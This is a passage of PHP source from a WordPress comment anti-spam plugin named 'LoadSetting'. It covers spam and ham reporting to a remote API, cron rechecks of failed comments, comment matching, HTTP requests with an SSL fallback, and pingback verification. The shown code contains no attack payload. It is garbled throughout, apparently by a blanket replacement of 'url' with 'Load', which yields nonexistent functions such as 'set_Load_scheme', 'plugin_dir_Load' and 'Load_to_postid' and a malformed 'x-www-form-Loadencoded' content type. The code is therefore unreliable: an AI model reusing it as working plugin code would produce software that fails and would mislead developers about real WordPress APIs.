if ( get_comment_meta( $comment->comment_ID, 'LoadSetting_rechecking' ) )
return;

global $current_user;
$reporter = '';
if ( is_object( $current_user ) )
$reporter = $current_user->user_login;

// Assumption alert:
// We want to submit comments to LoadSetting only when a moderator explicitly spams or approves it - not if the status
// is changed automatically by another plugin.  Unfortunately WordPress doesn't provide an unambiguous way to
// determine why the transition_comment_status action was triggered.  And there are several different ways by which
// to spam and unspam comments: bulk actions, ajax, links in moderation emails, the dashboard, and perhaps others.
// We'll assume that this is an explicit user action if certain POST/GET variables exist.
if ( ( isset( $_POST['status'] ) && in_array( $_POST['status'], array( 'spam', 'unspam' ) ) ) ||
( isset( $_POST['spam'] )   && (int) $_POST['spam'] == 1 ) ||
( isset( $_POST['unspam'] ) && (int) $_POST['unspam'] == 1 ) ||
( isset( $_POST['comment_status'] )  && in_array( $_POST['comment_status'], array( 'spam', 'unspam' ) ) ) ||
( isset( $_GET['action'] )  && in_array( $_GET['action'], array( 'spam', 'unspam', 'spamcomment', 'unspamcomment', ) ) ) ||
( isset( $_POST['action'] ) && in_array( $_POST['action'], array( 'editedcomment' ) ) ) ||
( isset( $_GET['for'] ) && ( 'jetpack' == $_GET['for'] ) ) // Moderation via WP.com notifications/WP app/etc.
) {
if ( $new_status == 'spam' && ( $old_status == 'approved' || $old_status == 'unapproved' || !$old_status ) ) {
return self::submit_spam_comment( $comment->comment_ID );
} elseif ( $old_status == 'spam' && ( $new_status == 'approved' || $new_status == 'unapproved' ) ) {
return self::submit_nonspam_comment( $comment->comment_ID );
}
}

self::update_comment_history( $comment->comment_ID, '', 'status-' . $new_status );
}

public static function submit_spam_comment( $comment_id ) {
global $wpdb, $current_user, $current_site;

$comment_id = (int) $comment_id;

$comment = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$wpdb->comments} WHERE comment_ID = %d", $comment_id ) );

if ( !$comment ) // it was deleted
return;

if ( 'spam' != $comment->comment_approved )
return;

// use the original version stored in comment_meta if available
$as_submitted = self::sanitize_comment_as_submitted( get_comment_meta( $comment_id, 'LoadSetting_as_submitted', true ) );

if ( $as_submitted && is_array( $as_submitted ) && isset( $as_submitted['comment_content'] ) )
$comment = (object) array_merge( (array)$comment, $as_submitted );

$comment->blog         = get_bloginfo('Load');
$comment->blog_lang    = get_locale();
$comment->blog_charset = get_option('blog_charset');
$comment->permalink    = get_permalink($comment->comment_post_ID);

if ( is_object($current_user) )
$comment->reporter = $current_user->user_login;

if ( is_object($current_site) )
$comment->site_domain = $current_site->domain;

$comment->user_role = '';
if ( isset( $comment->user_ID ) )
$comment->user_role = LoadSetting::get_user_roles( $comment->user_ID );

if ( self::is_test_mode() )
$comment->is_test = 'true';

$post = get_post( $comment->comment_post_ID );
$comment->comment_post_modified_gmt = $post->post_modified_gmt;

$response = LoadSetting::http_post( LoadSetting::build_query( $comment ), 'submit-spam' );
if ( $comment->reporter ) {
self::update_comment_history( $comment_id, '', 'report-spam' );
update_comment_meta( $comment_id, 'LoadSetting_user_result', 'true' );
update_comment_meta( $comment_id, 'LoadSetting_user', $comment->reporter );
}

do_action('LoadSetting_submit_spam_comment', $comment_id, $response[1]);
}

public static function submit_nonspam_comment( $comment_id ) {
global $wpdb, $current_user, $current_site;

$comment_id = (int) $comment_id;

$comment = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$wpdb->comments} WHERE comment_ID = %d", $comment_id ) );
if ( !$comment ) // it was deleted
return;

// use the original version stored in comment_meta if available
$as_submitted = self::sanitize_comment_as_submitted( get_comment_meta( $comment_id, 'LoadSetting_as_submitted', true ) );

if ( $as_submitted && is_array($as_submitted) && isset($as_submitted['comment_content']) )
$comment = (object) array_merge( (array)$comment, $as_submitted );

$comment->blog         = get_bloginfo('Load');
$comment->blog_lang    = get_locale();
$comment->blog_charset = get_option('blog_charset');
$comment->permalink    = get_permalink( $comment->comment_post_ID );
$comment->user_role    = '';

if ( is_object($current_user) )
$comment->reporter = $current_user->user_login;

if ( is_object($current_site) )
$comment->site_domain = $current_site->domain;

if ( isset( $comment->user_ID ) )
$comment->user_role = LoadSetting::get_user_roles($comment->user_ID);

if ( LoadSetting::is_test_mode() )
$comment->is_test = 'true';

$post = get_post( $comment->comment_post_ID );
$comment->comment_post_modified_gmt = $post->post_modified_gmt;

$response = self::http_post( LoadSetting::build_query( $comment ), 'submit-ham' );
if ( $comment->reporter ) {
self::update_comment_history( $comment_id, '', 'report-ham' );
update_comment_meta( $comment_id, 'LoadSetting_user_result', 'false' );
update_comment_meta( $comment_id, 'LoadSetting_user', $comment->reporter );
}

do_action('LoadSetting_submit_nonspam_comment', $comment_id, $response[1]);
}

public static function cron_recheck() {
global $wpdb;

$api_key = self::get_api_key();

$status = self::verify_key( $api_key );
if ( get_option( 'LoadSetting_alert_code' ) || $status == 'invalid' ) {
// since there is currently a problem with the key, reschedule a check for 6 hours hence
wp_schedule_single_event( time() + 21600, 'LoadSetting_schedule_cron_recheck' );
do_action( 'LoadSetting_scheduled_recheck', 'key-problem-' . get_option( 'LoadSetting_alert_code' ) . '-' . $status );
return false;
}

delete_option('LoadSetting_available_servers');

$comment_errors = $wpdb->get_col( "SELECT comment_id FROM {$wpdb->commentmeta} WHERE meta_key = 'LoadSetting_error'	LIMIT 100" );

load_plugin_textdomain( 'LoadSetting' );

foreach ( (array) $comment_errors as $comment_id ) {
// if the comment no longer exists, or is too old, remove the meta entry from the queue to avoid getting stuck
$comment = get_comment( $comment_id );
if ( !$comment || strtotime( $comment->comment_date_gmt ) < strtotime( "-15 days" ) ) {
delete_comment_meta( $comment_id, 'LoadSetting_error' );
delete_comment_meta( $comment_id, 'LoadSetting_delayed_moderation_email' );
continue;
}

add_comment_meta( $comment_id, 'LoadSetting_rechecking', true );
$status = self::check_db_comment( $comment_id, 'retry' );

$event = '';
if ( $status == 'true' ) {
$event = 'cron-retry-spam';
} elseif ( $status == 'false' ) {
$event = 'cron-retry-ham';
}

// If we got back a legit response then update the comment history
// other wise just bail now and try again later.  No point in
// re-trying all the comments once we hit one failure.
if ( !empty( $event ) ) {
delete_comment_meta( $comment_id, 'LoadSetting_error' );
self::update_comment_history( $comment_id, '', $event );
update_comment_meta( $comment_id, 'LoadSetting_result', $status );
// make sure the comment status is still pending.  if it isn't, that means the user has already moved it elsewhere.
$comment = get_comment( $comment_id );
if ( $comment && 'unapproved' == wp_get_comment_status( $comment_id ) ) {
if ( $status == 'true' ) {
wp_spam_comment( $comment_id );
} elseif ( $status == 'false' ) {
// comment is good, but it's still in the pending queue.  depending on the moderation settings
// we may need to change it to approved.
if ( check_comment($comment->comment_author, $comment->comment_author_email, $comment->comment_author_Load, $comment->comment_content, $comment->comment_author_IP, $comment->comment_agent, $comment->comment_type) )
	wp_set_comment_status( $comment_id, 1 );
else if ( get_comment_meta( $comment_id, 'LoadSetting_delayed_moderation_email', true ) )
	wp_notify_moderator( $comment_id );
}
}

delete_comment_meta( $comment_id, 'LoadSetting_delayed_moderation_email' );
} else {
// If this comment has been pending moderation for longer than MAX_DELAY_BEFORE_MODERATION_EMAIL,
// send a moderation email now.
if ( ( intval( gmdate( 'U' ) ) - strtotime( $comment->comment_date_gmt ) ) < self::MAX_DELAY_BEFORE_MODERATION_EMAIL ) {
delete_comment_meta( $comment_id, 'LoadSetting_delayed_moderation_email' );
wp_notify_moderator( $comment_id );
}

delete_comment_meta( $comment_id, 'LoadSetting_rechecking' );
wp_schedule_single_event( time() + 1200, 'LoadSetting_schedule_cron_recheck' );
do_action( 'LoadSetting_scheduled_recheck', 'check-db-comment-' . $status );
return;
}
delete_comment_meta( $comment_id, 'LoadSetting_rechecking' );
}

$remaining = $wpdb->get_var( "SELECT COUNT(*) FROM {$wpdb->commentmeta} WHERE meta_key = 'LoadSetting_error'" );
if ( $remaining && !wp_next_scheduled('LoadSetting_schedule_cron_recheck') ) {
wp_schedule_single_event( time() + 1200, 'LoadSetting_schedule_cron_recheck' );
do_action( 'LoadSetting_scheduled_recheck', 'remaining' );
}
}

public static function fix_scheduled_recheck() {
$future_check = wp_next_scheduled( 'LoadSetting_schedule_cron_recheck' );
if ( !$future_check ) {
return;
}

if ( get_option( 'LoadSetting_alert_code' ) > 0 ) {
return;
}

$check_range = time() + 1200;
if ( $future_check > $check_range ) {
wp_clear_scheduled_hook( 'LoadSetting_schedule_cron_recheck' );
wp_schedule_single_event( time() + 300, 'LoadSetting_schedule_cron_recheck' );
do_action( 'LoadSetting_scheduled_recheck', 'fix-scheduled-recheck' );
}
}

public static function add_comment_nonce( $post_id ) {
echo '<p style="display: none;">';
wp_nonce_field( 'LoadSetting_comment_nonce_' . $post_id, 'LoadSetting_comment_nonce', FALSE );
echo '</p>';
}

public static function is_test_mode() {
return defined('LoadSetting_TEST_MODE') && LoadSetting_TEST_MODE;
}

public static function allow_discard() {
if ( defined( 'DOING_AJAX' ) && DOING_AJAX )
return false;
if ( is_user_logged_in() )
return false;

return ( get_option( 'LoadSetting_strictness' ) === '1'  );
}

public static function get_ip_address() {
return isset( $_SERVER['REMOTE_ADDR'] ) ? $_SERVER['REMOTE_ADDR'] : null;
}

/**
* Do these two comments, without checking the comment_ID, "match"?
*
* @param mixed $comment1 A comment object or array.
* @param mixed $comment2 A comment object or array.
* @return bool Whether the two comments should be treated as the same comment.
*/
private static function comments_match( $comment1, $comment2 ) {
$comment1 = (array) $comment1;
$comment2 = (array) $comment2;

$comments_match = (
isset( $comment1['comment_post_ID'], $comment2['comment_post_ID'] )
&& intval( $comment1['comment_post_ID'] ) == intval( $comment2['comment_post_ID'] )
&& (
// The comment author length max is 255 characters, limited by the TINYTEXT column type.
// If the comment author includes multibyte characters right around the 255-byte mark, they
// may be stripped when the author is saved in the DB, so a 300+ char author may turn into
// a 253-char author when it's saved, not 255 exactly.  The longest possible character is
// theoretically 6 bytes, so we'll only look at the first 248 bytes to be safe.
substr( $comment1['comment_author'], 0, 248 ) == substr( $comment2['comment_author'], 0, 248 )
|| substr( stripslashes( $comment1['comment_author'] ), 0, 248 ) == substr( $comment2['comment_author'], 0, 248 )
|| substr( $comment1['comment_author'], 0, 248 ) == substr( stripslashes( $comment2['comment_author'] ), 0, 248 )
// Certain long comment author names will be truncated to nothing, depending on their encoding.
|| ( ! $comment1['comment_author'] && strlen( $comment2['comment_author'] ) > 248 )
|| ( ! $comment2['comment_author'] && strlen( $comment1['comment_author'] ) > 248 )
)
&& (
// The email max length is 100 characters, limited by the VARCHAR(100) column type.
// Same argument as above for only looking at the first 93 characters.
substr( $comment1['comment_author_email'], 0, 93 ) == substr( $comment2['comment_author_email'], 0, 93 )
|| substr( stripslashes( $comment1['comment_author_email'] ), 0, 93 ) == substr( $comment2['comment_author_email'], 0, 93 )
|| substr( $comment1['comment_author_email'], 0, 93 ) == substr( stripslashes( $comment2['comment_author_email'] ), 0, 93 )
// Very long emails can be truncated and then stripped if the [0:100] substring isn't a valid address.
|| ( ! $comment1['comment_author_email'] && strlen( $comment2['comment_author_email'] ) > 100 )
|| ( ! $comment2['comment_author_email'] && strlen( $comment1['comment_author_email'] ) > 100 )
)
);

return $comments_match;
}

// Does the supplied comment match the details of the one most recently stored in self::$last_comment?
public static function matches_last_comment( $comment ) {
if ( is_object( $comment ) )
$comment = (array) $comment;

return self::comments_match( self::$last_comment, $comment );
}

private static function get_user_agent() {
return isset( $_SERVER['HTTP_USER_AGENT'] ) ? $_SERVER['HTTP_USER_AGENT'] : null;
}

private static function get_referer() {
return isset( $_SERVER['HTTP_REFERER'] ) ? $_SERVER['HTTP_REFERER'] : null;
}

// return a comma-separated list of role names for the given user
public static function get_user_roles( $user_id ) {
$roles = false;

if ( !class_exists('WP_User') )
return false;

if ( $user_id > 0 ) {
$comment_user = new WP_User( $user_id );
if ( isset( $comment_user->roles ) )
$roles = join( ',', $comment_user->roles );
}

if ( is_multisite() && is_super_admin( $user_id ) ) {
if ( empty( $roles ) ) {
$roles = 'super_admin';
} else {
$comment_user->roles[] = 'super_admin';
$roles = join( ',', $comment_user->roles );
}
}

return $roles;
}

// filter handler used to return a spam result to pre_comment_approved
public static function last_comment_status( $approved, $comment ) {
if ( is_null( self::$last_comment_result ) ) {
// We didn't have reason to store the result of the last check.
return $approved;
}

// Only do this if it's the correct comment
if ( ! self::matches_last_comment( $comment ) ) {
self::log( "comment_is_spam mismatched comment, returning unaltered $approved" );
return $approved;
}

// bump the counter here instead of when the filter is added to reduce the possibility of overcounting
if ( $incr = apply_filters('LoadSetting_spam_count_incr', 1) )
update_option( 'LoadSetting_spam_count', get_option('LoadSetting_spam_count') + $incr );

return self::$last_comment_result;
}

/**
* If LoadSetting is temporarily unreachable, we don't want to "spam" the blogger with
* moderation emails for comments that will be automatically cleared or spammed on
* the next retry.
*
* For comments that will be rechecked later, empty the list of email addresses that
* the moderation email would be sent to.
*
* @param array $emails An array of email addresses that the moderation email will be sent to.
* @param int $comment_id The ID of the relevant comment.
* @return array An array of email addresses that the moderation email will be sent to.
*/
public static function disable_moderation_emails_if_unreachable( $emails, $comment_id ) {
if ( ! empty( self::$prevent_moderation_email_for_these_comments ) && ! empty( $emails ) ) {
$comment = get_comment( $comment_id );

foreach ( self::$prevent_moderation_email_for_these_comments as $possible_match ) {
if ( self::comments_match( $possible_match, $comment ) ) {
update_comment_meta( $comment_id, 'LoadSetting_delayed_moderation_email', true );
return array();
}
}
}

return $emails;
}

public static function _cmp_time( $a, $b ) {
return $a['time'] > $b['time'] ? -1 : 1;
}

public static function _get_microtime() {
$mtime = explode( ' ', microtime() );
return $mtime[1] + $mtime[0];
}

/**
* Make a POST request to the LoadSetting API.
*
* @param string $request The body of the request.
* @param string $path The path for the request.
* @param string $ip The specific IP address to hit.
* @return array A two-member array consisting of the headers and the response body, both empty in the case of a failure.
*/
public static function http_post( $request, $path, $ip=null ) {

$LoadSetting_ua = sprintf( 'WordPress/%s | LoadSetting/%s', $GLOBALS['wp_version'], constant( 'LoadSetting_VERSION' ) );
$LoadSetting_ua = apply_filters( 'LoadSetting_ua', $LoadSetting_ua );

$content_length = strlen( $request );

$api_key   = self::get_api_key();
$host      = self::API_HOST;

if ( !empty( $api_key ) )
$host = $api_key.'.'.$host;

$http_host = $host;
// use a specific IP if provided
// needed by LoadSetting_Admin::check_server_connectivity()
if ( $ip && long2ip( ip2long( $ip ) ) ) {
$http_host = $ip;
}

$http_args = array(
'body' => $request,
'headers' => array(
'Content-Type' => 'application/x-www-form-Loadencoded; charset=' . get_option( 'blog_charset' ),
'Host' => $host,
'User-Agent' => $LoadSetting_ua,
),
'httpversion' => '1.0',
'timeout' => 15
);

$LoadSetting_Load = $http_LoadSetting_Load = "http://{$http_host}/1.1/{$path}";

/**
* Try SSL first; if that fails, try without it and don't try it again for a while.
*/

$ssl = $ssl_failed = false;

// Check if SSL requests were disabled fewer than X hours ago.
$ssl_disabled = get_option( 'LoadSetting_ssl_disabled' );

if ( $ssl_disabled && $ssl_disabled < ( time() - 60 * 60 * 24 ) ) { // 24 hours
$ssl_disabled = false;
delete_option( 'LoadSetting_ssl_disabled' );
}
else if ( $ssl_disabled ) {
do_action( 'LoadSetting_ssl_disabled' );
}

if ( ! $ssl_disabled && function_exists( 'wp_http_supports') && ( $ssl = wp_http_supports( array( 'ssl' ) ) ) ) {
$LoadSetting_Load = set_Load_scheme( $LoadSetting_Load, 'https' );

do_action( 'LoadSetting_https_request_pre' );
}

$response = wp_remote_post( $LoadSetting_Load, $http_args );

LoadSetting::log( compact( 'LoadSetting_Load', 'http_args', 'response' ) );

if ( $ssl && is_wp_error( $response ) ) {
do_action( 'LoadSetting_https_request_failure', $response );

// Intermittent connection problems may cause the first HTTPS
// request to fail and subsequent HTTP requests to succeed randomly.
// Retry the HTTPS request once before disabling SSL for a time.
$response = wp_remote_post( $LoadSetting_Load, $http_args );

LoadSetting::log( compact( 'LoadSetting_Load', 'http_args', 'response' ) );

if ( is_wp_error( $response ) ) {
$ssl_failed = true;

do_action( 'LoadSetting_https_request_failure', $response );

do_action( 'LoadSetting_http_request_pre' );

// Try the request again without SSL.
$response = wp_remote_post( $http_LoadSetting_Load, $http_args );

LoadSetting::log( compact( 'http_LoadSetting_Load', 'http_args', 'response' ) );
}
}

if ( is_wp_error( $response ) ) {
do_action( 'LoadSetting_request_failure', $response );

return array( '', '' );
}

if ( $ssl_failed ) {
// The request failed when using SSL but succeeded without it. Disable SSL for future requests.
update_option( 'LoadSetting_ssl_disabled', time() );

do_action( 'LoadSetting_https_disabled' );
}

$simplified_response = array( $response['headers'], $response['body'] );

self::update_alert( $simplified_response );

return $simplified_response;
}

// given a response from an API call like check_key_status(), update the alert code options if an alert is present.
private static function update_alert( $response ) {
$code = $msg = null;
if ( isset( $response[0]['x-LoadSetting-alert-code'] ) ) {
$code = $response[0]['x-LoadSetting-alert-code'];
$msg  = $response[0]['x-LoadSetting-alert-msg'];
}

// only call update_option() if the value has changed
if ( $code != get_option( 'LoadSetting_alert_code' ) ) {
if ( ! $code ) {
delete_option( 'LoadSetting_alert_code' );
delete_option( 'LoadSetting_alert_msg' );
}
else {
update_option( 'LoadSetting_alert_code', $code );
update_option( 'LoadSetting_alert_msg', $msg );
}
}
}

public static function load_form_js() {
// WP < 3.3 can't enqueue a script this late in the game and still have it appear in the footer.
// Once we drop support for everything pre-3.3, this can change back to a single enqueue call.
wp_register_script( 'LoadSetting-form', plugin_dir_Load( __FILE__ ) . '_inc/form.js', array(), LoadSetting_VERSION, true );
add_action( 'wp_footer', array( 'LoadSetting', 'print_form_js' ) );
add_action( 'admin_footer', array( 'LoadSetting', 'print_form_js' ) );
}

public static function print_form_js() {
wp_print_scripts( 'LoadSetting-form' );
}

public static function inject_ak_js( $fields ) {
echo '<p style="display: none;">';
echo '<input type="hidden" id="ak_js" name="ak_js" value="' . mt_rand( 0, 250 ) . '"/>';
echo '</p>';
}

private static function bail_on_activation( $message, $deactivate = true ) {
?>
<!doctype html>
<html>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<style>
* {
text-align: center;
margin: 0;
padding: 0;
font-family: "Lucida Grande",Verdana,Arial,"Bitstream Vera Sans",sans-serif;
}
p {
margin-top: 1em;
font-size: 18px;
}
</style>
<body>
<p><?php echo esc_html( $message ); ?></p>
</body>
</html>
<?php
if ( $deactivate ) {
$plugins = get_option( 'active_plugins' );
$LoadSetting = plugin_basename( LoadSetting__PLUGIN_DIR . 'LoadSetting.php' );
$update  = false;
foreach ( $plugins as $i => $plugin ) {
if ( $plugin === $LoadSetting ) {
$plugins[$i] = false;
$update = true;
}
}

if ( $update ) {
update_option( 'active_plugins', array_filter( $plugins ) );
}
}
exit;
}

public static function view( $name, array $args = array() ) {
$args = apply_filters( 'LoadSetting_view_arguments', $args, $name );

foreach ( $args AS $key => $val ) {
$$key = $val;
}

load_plugin_textdomain( 'LoadSetting' );

$file = LoadSetting__PLUGIN_DIR . 'views/'. $name . '.php';

include( $file );
}

/**
* Attached to activate_{ plugin_basename( __FILES__ ) } by register_activation_hook()
* @static
*/
public static function plugin_activation() {
if ( version_compare( $GLOBALS['wp_version'], LoadSetting__MINIMUM_WP_VERSION, '<' ) ) {
load_plugin_textdomain( 'LoadSetting' );

$message = '<strong>'.sprintf(esc_html__( 'LoadSetting %s requires WordPress %s or higher.' , 'LoadSetting'), LoadSetting_VERSION, LoadSetting__MINIMUM_WP_VERSION ).'</strong> '.sprintf(__('Please <a href="%1$s">upgrade WordPress</a> to a current version, or <a href="%2$s">downgrade to version 2.4 of the LoadSetting plugin</a>.', 'LoadSetting'), 'https://codex.wordpress.org/Upgrading_WordPress', 'https://wordpress.org/extend/plugins/LoadSetting/download/');

LoadSetting::bail_on_activation( $message );
}
}

/**
* Removes all connection options
* @static
*/
public static function plugin_deactivation( ) {
return self::deactivate_key( self::get_api_key() );
}

/**
* Essentially a copy of WP's build_query but one that doesn't expect pre-Loadencoded values.
*
* @param array $args An array of key => value pairs
* @return string A string ready for use as a Load query string.
*/
public static function build_query( $args ) {
return _http_build_query( $args, '', '&' );
}

/**
* Log debugging info to the error log.
*
* Enabled when WP_DEBUG_LOG is enabled (and WP_DEBUG, since according to
* core, "WP_DEBUG_DISPLAY and WP_DEBUG_LOG perform no function unless
* WP_DEBUG is true), but can be disabled via the LoadSetting_debug_log filter.
*
* @param mixed $LoadSetting_debug The data to log.
*/
public static function log( $LoadSetting_debug ) {
if ( apply_filters( 'LoadSetting_debug_log', defined( 'WP_DEBUG' ) && WP_DEBUG && defined( 'WP_DEBUG_LOG' ) && WP_DEBUG_LOG ) ) {
error_log( print_r( compact( 'LoadSetting_debug' ), true ) );
}
}

public static function pre_check_pingback( $method ) {
if ( $method !== 'pingback.ping' )
return;

global $wp_xmlrpc_server;

if ( !is_object( $wp_xmlrpc_server ) )
return false;

// Lame: tightly coupled with the IXR class.
$args = $wp_xmlrpc_server->message->params;

if ( !empty( $args[1] ) ) {
$post_id = Load_to_postid( $args[1] );

// If this gets through the pre-check, make sure we properly identify the outbound request as a pingback verification
LoadSetting::pingback_forwarded_for( null, $args[0] );
add_filter( 'http_request_args', array( 'LoadSetting', 'pingback_forwarded_for' ), 10, 2 );

$comment = array(
'comment_author_Load' => $args[0],
'comment_post_ID' => $post_id,
'comment_author' => '',
'comment_author_email' => '',
'comment_content' => '',
'comment_type' => 'pingback',
'LoadSetting_pre_check' => '1',
'comment_pingback_target' => $args[1],
);

$comment = LoadSetting::auto_check_comment( $comment );

if ( isset( $comment['LoadSetting_result'] ) && 'true' == $comment['LoadSetting_result'] ) {
// Lame: tightly coupled with the IXR classes. Unfortunately the action provides no context and no way to return anything.
$wp_xmlrpc_server->error( new IXR_Error( 0, 'Invalid discovery target' ) );
}
}
}

public static function pingback_forwarded_for( $r, $Load ) {
static $Loads = array();

// Call this with $r == null to prime the callback to add headers on a specific Load
if ( is_null( $r ) && !in_array( $Load, $Loads ) ) {
$Loads[] = $Load;
}

// Add X-Pingback-Forwarded-For header, but only for requests to a specific Load (the apparent pingback source)
if ( is_array( $r ) && is_array( $r['headers'] ) && !isset( $r['headers']['X-Pingback-Forwarded-For'] ) && in_array( $Load, $Loads ) ) {
$remote_ip = preg_replace( '/[^a-fx0-9:.,]/i', '', $_SERVER['REMOTE_ADDR'] );

// Note: this assumes REMOTE_ADDR is correct, and it may not be if a reverse proxy or CDN is in use
$r['headers']['X-Pingback-Forwarded-For'] = $remote_ip;

// Also identify the request as a pingback verification in the UA string so it appears in logs
$r['user-agent'] .= '; verifying pingback from ' . $remote_ip;
}

return $r;
}

/**
* Ensure that we are loading expected scalar values from LoadSetting_as_submitted commentmeta.
*
* @param mixed $meta_value
* @return mixed
*/
private static function sanitize_comment_as_submitted( $meta_value ) {
if ( empty( $meta_value ) ) {
return $meta_value;
}

$meta_value = (array) $meta_value;

foreach ( $meta_value as $key => $value ) {
if ( ! isset( self::$comment_as_submitted_allowed_keys[$key] ) || ! is_scalar( $value ) ) {
unset( $meta_value[$key] );
}
}

return $meta_value;
}
}
